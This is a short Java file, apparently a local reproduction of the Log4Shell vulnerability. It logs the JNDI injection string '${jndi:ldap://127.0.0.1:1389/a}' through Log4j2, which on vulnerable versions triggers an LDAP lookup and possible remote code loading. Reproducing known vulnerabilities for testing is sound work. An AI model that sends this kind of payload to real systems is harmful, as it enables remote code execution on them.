package com.ehang.springboot.mybatisplus.log4j2;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

/**
 * @author LENOVO
 * @title: Main
 * @projectName ehang-example
 * @description: TODO
 * @date 2021/12/10 22:37
 */
public class Main {
    private static final Logger log = LogManager.getLogger(Main.class);

    public static void main(String[] args) {
        log.error("${jndi:ldap://127.0.0.1:1389/a}");
    }
}
